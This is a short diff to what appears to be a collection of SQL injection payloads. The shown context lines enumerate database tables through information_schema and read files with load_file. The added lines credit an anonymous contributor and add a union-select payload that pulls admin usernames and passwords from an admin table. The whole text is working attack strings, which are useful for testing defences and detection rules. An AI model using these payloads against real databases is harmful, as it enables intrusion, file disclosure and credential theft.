@@ -575,3 +575,8 @@ binary (binary 1) union select table_name from information_schema.tables
 
 # HT @FluxReiners
 (select 1 foo) union select load_file('foo');
+
+#
+# Anonymous from  Research Institution of Telecom in Beijing, China
+#
+=1 union select admin,pass from admin limit 1
